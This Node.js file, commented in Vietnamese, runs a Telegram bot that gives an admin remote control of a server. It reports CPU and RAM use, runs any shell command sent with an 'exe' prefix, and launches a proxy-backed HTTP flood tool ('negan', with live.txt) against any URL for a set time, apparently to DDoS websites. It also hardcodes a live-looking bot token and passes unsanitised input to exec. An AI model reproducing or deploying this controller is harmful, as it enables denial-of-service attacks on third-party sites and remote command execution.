const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình bot
const token = '7534473375:AAEcw4C0iYwK0oHoXjt0ioq4DYGFyS7WFX0'; // Thay thế bằng token của bạn
const bot = new TelegramBot(token, { polling: true });
const adminId = 7371969470; // Thay thế bằng ID của admin

// Đặt bot sẵn sàng ngay lập tức
let isBotReady = true;
bot.sendMessage(adminId, '🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm lấy thông số CPU và RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// Gửi thông số CPU và RAM mỗi 14 giây
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
}, 14000);

// Hàm gửi kết quả dưới dạng Markdown
const sendMarkdownResult = async (chatId, command, output) => {
    const message = `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``;
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
        await bot.sendMessage(chatId, `🚫 Lỗi khi gửi kết quả: ${error.message}`);
    }
};

// Hàm thực thi lệnh pkill cho từng tên file
const executePkill = async (chatId, files) => {
    for (const file of files) {
        const command = `pkill -f -9 ${file}`;
        console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
        await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', (code) => {
            console.log(`[DEBUG] Lệnh đã kết thúc với mã thoát: ${code}`);
            if (code === 0) {
                sendMarkdownResult(chatId, command, '✅ Lệnh đã được thực thi thành công.');
            } else {
                sendMarkdownResult(chatId, command, '❌ Không tìm thấy tiến trình phù hợp.');
            }
        });
    }
};

// Xử lý lệnh từ admin
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');

    // Xử lý lệnh dạng "https://muahack.com 10"
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
        const [host, time] = parts, command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
        await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', () => { console.log(`[DEBUG] Lệnh đã kết thúc với kết quả: ${output}`); sendMarkdownResult(chatId, command, output); });
        return;
    }

    // Xử lý lệnh bắt đầu bằng "exe"
    if (text.startsWith('exe ')) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
        console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
        await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);

        // Xử lý lệnh pkill đặc biệt
        if (command.startsWith('pkill')) {
            const filesToKill = command.split(' ').slice(1); // Lấy các tên file từ lệnh pkill
            if (filesToKill.length === 0) {
                await bot.sendMessage(chatId, '❌ Lệnh pkill cần có ít nhất một tên file.');
                return;
            }
            await executePkill(chatId, filesToKill);
            return;
        }

        // Xử lý các lệnh khác
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', () => { console.log(`[DEBUG] Lệnh đã kết thúc với kết quả: ${output}`); sendMarkdownResult(chatId, command, output); });
        return;
    }

    // Nếu lệnh không hợp lệ
    bot.sendMessage(chatId, 'Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.');
});
